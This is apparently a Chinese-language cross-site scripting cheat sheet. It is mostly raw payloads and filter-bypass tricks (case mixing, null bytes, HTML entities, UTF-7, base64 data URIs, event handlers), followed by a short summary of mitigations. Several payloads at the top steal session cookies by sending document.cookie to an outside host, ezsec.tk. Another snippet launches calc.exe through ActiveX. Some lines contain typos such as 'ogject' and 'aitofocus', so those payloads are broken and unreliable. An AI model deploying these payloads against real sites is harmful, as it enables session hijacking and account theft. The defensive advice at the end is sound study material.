#XSS
---

##

`"/><script>alert(1)</script>`  
`"/><script>var+i=new+Image;+i.src="http://ezsec.tk:8000/"%2bdocument.cookie;</script>`  
`"/><script>window.open('http://ezsec.tk:8000/'+document.cookie)</script>`  
`"/><script src="http://ezsec.tk:8000/ck.js"></script><"`  

cookie.js  

```
window.location.href='http://ezsec.tk/?cookie='+document.cookie;
```

```
<input type='text' name='message' value='<script>alert(1)</script>'>
message = <script>alert(1)</script>

<script>
  var url = document.location;
  url = unescape(url);
  var message = url.substring(url.indexOf('message=') + 8, url.length);
  document.write(message);
</script>
```

```
<script>
  var o = ActiveXObject(WScript.shell);
  o.Run('calc.exe');
</script>
```

#####基本绕过
`"><script>alert(document.cookie)</script >`  
`"><ScRiPt>alert(document.cookie)</ScRiPt>`  
`%3e%3cscript%3ealert(document.cookie)%3c/script%3e`  
`"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>`  
`%00"><script>alert(document.cookie)</script >`  

#####脚本标签
除直接使用`<script>`标签外，还可以通过各种方法、使用复杂的语句来隐藏标签，从而避开某些过滤：  
  `<object data="data:text/html,<script>alert(1)</script>">`  
  `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`  
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click me</a>`  

#####事件处理器
`<xml onreadystatechange=alert(1)>`  
`<object onerror=alert(1)>`  
`<isindex type=image src=valid.gif onreadystatechange=alert(1)>`  
`<script onreadystatechange=alert(1)>`  
`<bgsound onpropertychange=alert(1)>`  
`<body onbeforeactivate=alert(1)>`  
`<body onactivate=alert(1)>`  
`<body onfocusin=alert(1)>`  
`<input autofocus onfocus=alert(1)>`  
`<input onblur=alert(1) aitofocus><input autofocus>`  
`<body onscroll=alert(1)><br><br>...<br><input autofocus>`  
`</a onmousemove=alert(1)>`  
`<audio src=1 onerror=alert(1)>`  

#####脚本伪协议
`<ogject data=javascript:alert(1)>`  

#####避开过滤
`<img onerror=alert(1) src=a>`  
`<iMg onerror=alert(1) src=a>`  
`<[%00]img onerror=alert(1) src=a>`  
`<i[%00]mg onerror=alert(1) src=a>`  
`<img/onerror="alert(1)"src=a>`  
`<iframe src=j&#x61;vasc&#x72;ipt&#x3a;alert&#x28;1&#x29;>`  
添加多余"0"  
`<img onerror=a&#x6c;ert(1) src=a>`  
`<img onerror=a&#x06c;ert(1) src=a>`  
`<img onerror=a&#x006c;ert(1) src=a>`  
`<img onerror=a&#x0006c;ert(1) src=a>`  

#####字符集
UTF-7  
`+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-`  

US-ASCII  

```
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE                            ; script¾
```

#常见xss绕过小总结
---

第一类：`1<tag on*=*/>`  
在html标签事件中触发,典型的是`on`事件,但是这种触发模式的缺陷在于不能直接触发所以更多的需要配合使用。  

eg：  
	1. 使html元素占据整个显示页面`<a onclick="alert('1')" style="postion:fixed;width:100%;heith:100%"> </a>`  
   2. 增加属性触发事件`<input onfocus="alert('1')" autofocus/>`  
   3. 自动触发事件`<body onload="alert('1')"></body>`  
在真实环境中，`'`、`"`、`(`、`)`都是属于黑名单中的成员，如果遇到以上四个字符被过滤的情况，那么我们就需要使用其他字符去代替，或者编码的方式去绕过。  

eg:  
    1. 不使用```"  <input onfocus=alert('1') autofocus/>```  
    2. 不使用```'  <input onfocus="alert(/1/)" autofocus/>```  
    3. 不使用```( )  <input onfocus="alert`'1'`" autofocus/>```  
    4. 不使用```' " ( ) <input onfocus=alert`1` autofocus/>```  
    5. 使用html实体编码绕过```<input onfocus="alert('1')" autofocus/>```  
    6. 使用html实体编码绕过变形```<input onfocus="&#97&#108&#101&#114&#116&#40&#39&#49&#39&#41" autofocus/>```  

这里如何修补该漏洞呢？常见修补方式有如下  

eg：  
    1. 使用环境允许插入html标签排版的情况下，很常见的就是将html事件熟悉转义为html实体编码字符，当然也可以直接拦截返回404。常见匹配策略`/on[^=]*=/ig`  
    2. 使用环境不允许插入html标签的情况下，不难看出所有的tag前面都紧贴着一个`<`，所以只需要将`<`使用html实体编码转换即可。常见匹配策略`/</g`  

第二类：`<tag src=*/>`  
该类型的触发点其实相对较少的，曾经最经典的一个莫属于IE6中的`<img src="alert('1')"/>`但是这个问题已经成为历史，在其它`tag`中使用`src`属性触发xss的列子也还是有的。  

eg：  
    1. 在iframe标签中加载一个脚本页面`<iframe src="./alert.html"></iframe>`  
    2. 在script标签中加载一个脚本`<script src="./alert.js"></script>`  
在src属性中可以使用可以直接请求一个外部连接，还可以用`Data` `URI` `scheme`直接嵌入文本  

eg：  
    1. 在iframe标签中使用`Data` `URI` `scheme`直接嵌入文本`<iframe src="data:text/html,<script>alert('1')</script>"></iframe>`  
    2. 在script标签中使用`Data` `URI` `scheme`直接嵌入文本`<script src="data:text/html,alert('1')"></script>`  
使用`Data` `URI` `scheme`直接嵌入文本，比较繁琐，但是这类的好处在于可以使用BASE64编码格式  

eg：  
    1. 在iframe标签中使用`Data` `URI` `scheme`直接嵌入BASE64编码后的文本`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnMScpPC9zY3JpcHQ+"></iframe>`  
    2. 在script标签中使用`Data` `URI` `scheme`直接嵌入BASE64编码后的文本`<script src="data:text/html;base64,YWxlcnQoJzEnKQ=="></script>`  
在该类型的变形中还可以结合第一类的变形使用  

eg：  
    1. 使用html实体编码`URI` `<script src="./alert.js"></script>`  
    2. 使用html实体编码`Data` `URI` `scheme` `<script src="data:text/html,alert('1')"></script>`  
    3. 使用html实体编码BASE64编码之后的`Data` `URI` `scheme` `<script src="data:text/html;base64,YWxlcnQoJzEnKQ=="></script>`  
该类问题的修补策略和第一类类似。常见方式有如下。  

eg：  
    1. 在允许使用外部元素的时候，鄙人不才没能想出处理方案。  
    2. 在不允许使用外部元素的时候，在`src`所指向的`URI`上加入当前网站的域名，以此限制内容为当前网站中的安全内容。  
    3. 在不允许使用元素引入的时候，但是允许插入html标签排版的情况下，指定`tag`白名单或者tag黑名单。  
    4. 不允许使用html标签的时候，将`<`转换为html实体编码。  
